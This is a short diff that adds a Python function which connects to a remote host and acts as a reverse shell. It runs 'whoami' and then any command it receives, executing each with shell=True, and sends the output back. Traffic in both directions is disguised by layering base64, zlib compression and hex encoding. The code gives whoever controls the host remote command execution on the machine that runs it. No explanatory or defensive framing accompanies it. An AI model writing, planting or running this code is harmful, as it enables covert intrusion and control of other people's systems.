@@ -1,0 +1,21 @@
+def client(host, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((host, port))
+    print('Connected to host {} and port {}'.format(host, port))
+    try:
+        command = 'whoami'
+        while True:
+            result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+            data = result.stdout.read()
+            data = base64.b64encode(data)
+            data = zlib.compress(data)
+            data = binascii.b2a_hex(data)
+            sock.send(data)
+            command = sock.recv(1024)
+            command = binascii.a2b_hex(command)
+            command = zlib.decompress(command)
+            command = base64.b64decode(command)
+            if command == 'exit':
+                break
+    except Exception as e:
+        print(e)
